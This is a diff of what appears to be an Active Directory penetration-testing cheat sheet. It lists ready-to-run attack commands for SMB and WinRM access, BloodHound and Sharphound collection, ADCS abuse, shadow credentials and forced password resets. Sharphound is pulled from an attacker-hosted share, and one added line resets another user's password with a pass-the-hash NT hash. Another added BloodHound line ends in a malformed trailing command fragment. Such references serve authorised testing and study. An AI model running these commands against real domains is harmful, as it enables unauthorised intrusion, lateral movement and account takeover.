@@ -217,7 +217,7 @@ impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm-py -i $DC -r $DOM
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
-bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET --zip -c All
+bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DOM_$TARGET --zip -c All; *_bloodhound.zip -d /Upload/bloodhound
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound --use-kcache
 //$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs --use-kcache
@@ -688,6 +688,7 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile us
 certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
 
 +---------- ForceChangePassword ----------+
+impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
 impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
 
